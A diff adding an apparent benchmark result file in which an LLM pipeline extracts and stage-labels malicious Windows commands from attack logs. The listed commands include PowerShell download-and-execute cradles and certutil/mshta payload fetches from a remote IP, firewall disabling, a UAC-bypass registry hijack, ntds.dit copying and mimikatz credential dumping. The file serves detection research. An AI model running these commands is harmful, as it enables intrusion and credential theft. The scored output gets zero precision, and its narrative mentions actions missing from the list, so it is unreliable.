@@ -1,0 +1,148 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('104.223.85.207:8082/a'))\\\"",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\\\47\\\\u065f\\\\ud81c\\\\u65ff\\\\ude08\\\\ucfe0\\\\ub098\\\\uc640\\\\uacc4\\\\ce58\\\\ud560\\\\uc694.py ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C ",
+        "stage": "Execution"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://124.223.85.207:8082/Test.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C \"Invoke-WebRequest http://124.223.85.207:8082/Test.hta -Method 'POST' -UseBasicParsing -ContentType \\\"application/json\\\"\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "cmd  /c start /min sangforcat.exe -v -server https://124.223.85.207:8443",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1548.002 -TestNumbers 2",
+        "stage": "Privilege Escalation"
+      },
+      {
+        "command": "netsh  Advfirewall?set?allprofiles state off ",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe delete HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\osk.exe /v Debugger /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe delete HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\utilman.exe /v Debugger /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe delete HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\magnify.exe /v Debugger /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe delete HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\narrator.exe /v Debugger /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe delete HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\DisplaySwitch.exe /v Debugger /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "reg.exe delete HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\atbroker.exe /v Debugger /f",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe & {$input_table = osk.exe, sethc.exe, utilman.exe, magnify.exe, narrator.exe, DisplaySwitch.exe, atbroker.exe.split()}.{Foreach ($item in $input_table){$item = $item.trim()}reg delete \"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\$item\" /v Debugger /f 2>&1 | Out-Null}",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "powershell.exe & {New-Item HKCU:\\\\software\\\\classes\\\\mscfile\\\\shell\\\\open\\\\command -Force Set-ItemProperty HKCU:\\\\software\\\\classes\\\\mscfile\\\\shell\\\\open\\\\command -Name (default) -Value C:\\\\Windows\\\\System32\\\\cmd.exe -Force Start-Process C:\\\\Windows\\\\System32\\\\eventvwr.msc}",
+        "stage": "Persistence"
+      },
+      {
+        "command": "esentutl.exe /y /vss c:\\\\windows\\\\ntds\\\\ntds.dit /d c:\\\\ntds.dit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C Invoke-AtomicTest T1546.008 -TestNumbers 1 -Cleanup",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "mimikatz2.exe   lsadump::sam exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "mimikatz.exe   LSADUMP::DCSync exit",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C mkdir timestomp ; echo ipconfig /all > timestomp/timestomp.txt ; (ls timestomp).LastWriteTime=\"2020-10-10 12:12:12\"",
+        "stage": "Collection"
+      },
+      {
+        "command": "REG ADD HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run /V Atomic Red Team /t REG_SZ /F /D C:\\\\Path\\\\AtomicRedTeam.exe",
+        "stage": "Persistence"
+      }
+    ],
+    "narrative": "The attacker initiated access using PowerShell, downloaded additional scripts, and contacted a remote server. They escalated privileges and evaded defenses by modifying Windows Defender settings, disabled the firewall, and tampered with registry entries. The attacker persisted through modifications of system files, injected malicious executables into the registry, and exfiltrated sensitive information with Mimikatz and Esentutl utilities.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 43083,
+      "completion_tokens": 3901,
+      "total_tokens": 46984,
+      "wall_clock_s": 162.844,
+      "parse_retries": 0
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 24,
+      "fn": 23
+    },
+    "stage": {
+      "precision": 0.0,
+      "recall": 0.0,
+      "f1": 0.0,
+      "tp": 0,
+      "fp": 24,
+      "fn": 23,
+      "recall_partial": 0.0
+    },
+    "hallucination_rate": 0.08,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 43083,
+      "completion_tokens": 3901,
+      "total_tokens": 46984,
+      "wall_clock_s": 162.844,
+      "parse_retries": 0
+    }
+  },
+  "meta": {
+    "variant": "scale_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA A100 80GB PCIe",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
